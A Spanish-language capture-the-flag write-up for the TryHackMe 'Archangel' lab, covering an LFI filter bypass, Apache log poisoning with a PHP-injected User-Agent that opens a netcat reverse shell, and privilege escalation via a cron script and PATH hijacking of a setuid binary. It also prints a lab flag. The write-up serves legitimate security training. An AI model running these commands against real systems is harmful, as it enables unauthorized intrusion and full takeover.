---
title:  CTF TryHackme Archangel
tags:
  - Boot2root
  - Web exploitation
  - Privilege escalation
  - LFI
  - Tryhackme
  - Linux
---

<div class="card mb-3">
    <center>
            <img class="card-img-top" src="/theme/img/THM/Archangel/titulo_archangel.jpeg"/>
    </center>
</div>

Máquina: Linux

IP: 10.10.25.190

<!--more-->

## Get a shell

Se realiza un reconocimiento para ver qué puertos tiene abiertos la máquina usando **nmap**:

```bash
nmap -p- 10.10.25.190
```

<div class="card mb-3">
    <img class="card-img" src="/theme/img/THM/Archangel/nmap_archangel.png"/>
</div>

La máquina tiene abiertos los puertos: **22/tcp (ssh)** y **80/tcp (http)**. Se analiza el contenido de la página web:

<div class="card mb-3">
    <img class="card-img" src="/theme/img/THM/Archangel/web.png"/>
</div>

Se realiza un escaneo con **gobuster** en busca de directorios ocultos en la web, pero nada interesante. Analizando la página se encuentra el nombre de dominio de la página support@**mafialive.thm**, por lo que se asocia este dominio con la IP en el fichero /etc/hosts:

```bash
10.10.25.190 mafialive.thm
```

El Virtual Hosting es un método para hostear múltiples nombres de dominio en un solo servidor, en este caso, esa IP.

Se procede a buscar mafialive.thm en el navegador para ver que esta hosteando y se encuentra la primera flag.

<div class="card mb-3">
    <img class="card-img" src="/theme/img/THM/Archangel/flag1.png"/>
</div>

Se vuelve a escanear con **gobuster** sobre el dominio mafialive.thm:

```bash
gobuster -u http://mafialive.thm -w /usr/share/wordlist/SecLists/Discovery/Web-Content/common.txt
```

<div class="card mb-3">
    <img class="card-img" src="/theme/img/THM/Archangel/dirbuster.png"/>
</div>

Se observa que tiene activado el fichero robots.txt y se accede a ese fichero para ver que directorios/ficheros ocultos puede nombrar:

User-agent: *

Disallow: /test.php

Se accede al contenido y es una página que tiene un botón que al pulsarlo realiza una petición GET sobre el parámetro view y el fichero **/var/www/html/development_testing/mrrobot.php** que muestra el texto "Control is an illusion".

Si intentamos cambiar el fichero por /etc/passwd, nos indica que no está permitido.

<div class="card mb-3">
    <img class="card-img" src="/theme/img/THM/Archangel/lfi.png"/>
</div>

Parece ser que hace algún tipo de comprobación para que no nos muestre cualquier fichero del sistema. Usando un wrapper PHP se puede obtener el código PHP del fichero test.php y saber que tipo de comprobación realiza.

`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`

Se nos mostrará el código en base64, se descodifica:

```php
<?php
    
    //FLAG: thm{explo1t1ng_lf1}
   function containsStr($str, $substr) {
       return strpos($str, $substr) !== false;
   }
   if(isset($_GET["view"])){
       if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
           include $_GET['view'];
       }else{
           echo 'Sorry, Thats not allowed';
       }
   }
?>
```

Se observa en el código que el parametro view no puede contener **../..** y tiene que tener **/var/www/html/development_testing**. El problema es que no se puede retroceder entre directorios usando ../... En cambio si se utiliza el punto (.) como directorio actual para que no contenga el string ".." dos veces seguido, podemos movernos entre directorios de la siguiente manera.

`/var/www/html/development_testing/.././.././.././../etc/passwd` 

<div class="card mb-3">
    <img class="card-img" src="/theme/img/THM/Archangel/passwd.png"/>
</div>

Si tenemos acceso a los logs de SSH o Apache, se puede realizar un envenenamiento de logs pudiendo ejecutar un RCE. En este caso, se tiene acceso al fichero **/var/log/apache2/access.log**. Para obtener una shell, se realiza una petición HTTP contra la página y dentro del atributo User-Agent se inyecta código PHP que se ejecute al refrescar la página.

```bash
curl -S -H "User-agent: Mozilla/5.0 <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.11.22.147 4444 >/tmp/f'); ?>" http://mafialive.thm/test.php
```

Si se refresca la página **/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log**, se genera una conexión reversa contra nuestra IP.

<div class="card mb-3">
    <img class="card-img" src="/theme/img/THM/Archangel/netcat.png"/>
</div>

En la carpeta /home/archangel, se encuentra la flag user.txt.

## Root the machine

Se inspecciona el sistema por varias carpetas y se encuentra en /opt un fichero **helloworld.sh** con los permisos 777 y creado por archangel. Un vector de elevación de privilegios o movimientos laterales es mediante el uso de crontab, se puede ver que ficheros se ejecutan, a que hora y con qué usuario en **/etc/crontab**.

<div class="card mb-3">
    <img class="card-img" src="/theme/img/THM/Archangel/crontab.png"/>
</div>

Se ve que el usuario archangel ejecuta /opt/helloworld.sh cada minuto. Como se tiene permisos sobre dicho fichero, lo editamos para que nos cree una shell reversa.

<div class="card mb-3">
    <img class="card-img" src="/theme/img/THM/Archangel/backupfiles.png"/>
</div>

Se consigue el acceso al usuario archangel y ver la siguiente flag.

<div class="card mb-3">
    <img class="card-img" src="/theme/img/THM/Archangel/netcat2.png"/>
</div>


Se busca si algún fichero tiene el setuid activado para elevar privilegios como root, y se observa que el binario **/home/archangel/secret/backup** tiene el setuid activado.

Se analiza con strings, y se llega a la conclusión que ejecuta **system("cp /home/user/archangel/myfiles/* /opt/backupfiles")**. Como ejecuta el comando cp con system, quiere decir que ejecuta el binario cp del sistema Unix, por lo que se puede crear un **nuevo binario cp en /tmp** y añadir la carpeta /tmp a la variable de entorno $PATH. El contenido del nuevo binario cp es:

```bash
#!/bin/bash

bash -p
```

<div class="card mb-3">
    <img class="card-img" src="/theme/img/THM/Archangel/path.png"/>
</div>

Se ejecuta nuevamente el fichero backup mediante crontab y se obtiene una shell como root.

<div class="card mb-3">
    <img class="card-img" src="/theme/img/THM/Archangel/rootflag.png"/>
</div>